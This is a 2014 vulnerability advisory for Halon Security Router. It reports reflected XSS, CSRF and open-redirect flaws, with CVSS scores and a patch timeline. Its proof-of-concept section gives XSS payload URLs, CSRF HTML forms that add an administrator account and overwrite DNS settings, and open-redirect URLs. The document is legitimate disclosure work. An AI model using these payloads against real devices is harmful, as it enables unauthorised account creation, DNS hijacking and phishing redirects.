ADVISORY INFORMATION
Advisory Name: Multiple Security Vulnerabilities in Halon Security Router
Date published: 2014-04-07
Vendors contacted: Halon Security (http://www.halon.se)
Researcher: Juan Manuel Garcia (http://www.linkedin.com/in/juanmagarcia)



VULNERABILITIES INFORMATION
Vulnerabilities:
1. Reflected Cross-Site Scripting (XSS) {OWASP Top 10 2013-A3}
2. Cross-site Request Forgery (CSRF) {OWASP Top 10 2013-A8}
3. Open Redirect {OWASP Top 10 2013-A10}

Severities:
1. Reflected XSS: Medium - CVSS v2 Base Score: 5.5 (AV:N/AC:L/Au:S/C:P/I:P/A:N)
2. CSRF: High - CVSS v2 Base Score: 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)
3. Open Redirect: High - CVSS v2 Base Score: 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)

Affected Applications: Security router (SR) v3.2-winter-r1 and earlier.

Affected Platforms: Software, virtual and hardware

Local / Remote: Remote

Vendor Status: Patched



VULNERABILITIES DESCRIPTION
1. Reflected XSS: https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29
2. CSRF: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
3. Open Redirect: https://www.owasp.org/index.php/Open_redirect



TECHNICAL DESCRIPTION AND PROOF OF CONCEPTS
1- Reflected XSS:
At least the following parameters are not properly sanitized:
 http://sr.demo.halon.se/commands/logviewer/?log=vic0';</script><script>alert(1)</script>
Parameter: log
 http://sr.demo.halon.se/fileviewer/?file=";</script><script>alert(1)</script>
Parameter: file
 http://sr.demo.halon.se/system/graphs/?graph='+alert(1)+'
Parameter: graph
 http://sr.demo.halon.se/commands/?command='+alert(1)+'
Parameter: command
 http://sr.demo.halon.se/system/users/?id='+alert(1)+'
Parameter: id
 http://sr.demo.halon.se/config/?uri='+alert(1)+'
Parameter: uri
Other parameters of the application might also be affected.


2- CSRF:
At least the following functions are vulnerable:
 Add user: http://xxx.xxx.xxx.xxx/system/users/?add=user

<html>
<body>
<form method="POST" name="form0" action="http://localhost:80/system/users/?add=user">
<input type="hidden" name="checkout" value="17"/>
<input type="hidden" name="apply" value=""/>
<input type="hidden" name="id" value=""/>
<input type="hidden" name="old_user" value=""/>
<input type="hidden" name="user" value="hacker"/>
<input type="hidden" name="full-name" value="ITFORCE H4x0r"/>
<input type="hidden" name="class" value=""/>
<input type="hidden" name="password" value="1234"/>
<input type="hidden" name="password2" value="1234"/>
</form>
</body>
</html>

DNS configuration: http://xxx.xxx.xxx.xxx/network/dns

<html>
<body>
<form method="POST" name="form0" action="http://localhost:80/network/dns/">
<input type="hidden" name="checkout" value="17"/>
<input type="hidden" name="apply" value=""/>
<input type="hidden" name="name-servers" value="8.8.8.8"/>
<input type="hidden" name="search-domain" value=""/>
<input type="hidden" name="host-name" value="sr.demo.halon.se"/>
</form>
</body>
</html>

 Network Configuration: http://xxx.xxx.xxx.xxx/network/basic
 Load Balancer Configuration: http://xxx.xxx.xxx.xxx/network/loadbalancer
 VPN Configuration: http://xxx.xxx.xxx.xxx/network/vpn
 Firewall Configuration: http://xxx.xxx.xxx.xxx/network/firewall
Other functions of the application might also be affected.


3- Open Redirect:
At least the following parameters are not properly sanitized:
 http://sr.demo.halon.se/cluster/?switch_to=&uri=http://itforce.tk
Parameter: uri
 http://sr.demo.halon.se/config/?checkout=17&uri=http://itforce.tk
Parameter: uri
Other parameters of the application might also be affected.



SOLUTION
Install / Upgrade to Security router (SR) v3.2r2
REPORT TIMELINE

2014-04-03: IT Force notifies the Halon team of the vulnerabilities and receives the support ticket ID ZOJ-105816.
2014-04-04: Vendor acknowledges the receipt of the information and informs that the vulnerabilities are going to be resolved in v3.2r2 and updates the SR online demo site.
2014-04-04: IT Force advises Halon on how to resolve the vulnerabilities reported.
2014-04-04: IT Force coordinate with Halon the advisory publication for April 07,2014.
2014-04-07: IT Force published the advisory.



CONTACT INFORMATION
www.itforce.tk